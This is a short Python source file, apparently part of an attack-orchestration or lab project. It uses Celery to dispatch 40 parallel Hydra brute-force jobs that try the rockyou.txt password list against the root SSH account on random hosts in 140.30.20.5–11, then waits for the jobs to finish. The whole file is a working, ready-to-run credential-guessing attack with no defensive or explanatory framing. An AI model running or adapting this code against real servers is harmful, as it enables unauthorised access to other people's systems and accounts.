#
#
from __future__ import absolute_import
from .celery import app
from .tasks_hydra import task_hydra
from celery.result import ResultSet
from .end_attack.end_attack import end_attack
import time
from subprocess import call
import random

@app.task

def start_attack():
	global r
	r = ResultSet([])
	valor=0
	while valor<40:
		cmd = ["hydra", "-l", "root", "-P", "rockyou.txt", str(randomize_ip()), "ssh", "-t", "4"]
		r.add(task_hydra.delay(cmd))
		valor = valor +1


def randomize_ip():
	randIP = random.randrange(5,12)
	ip = "140.30.20." + str(randIP)
	print("IP: " + ip)
	return ip


def end_attacks():
	global r
	r.join()
	if r.ready() == True:
		end_attack()

if __name__ == '__main__':
	start_attack()
	end_attacks()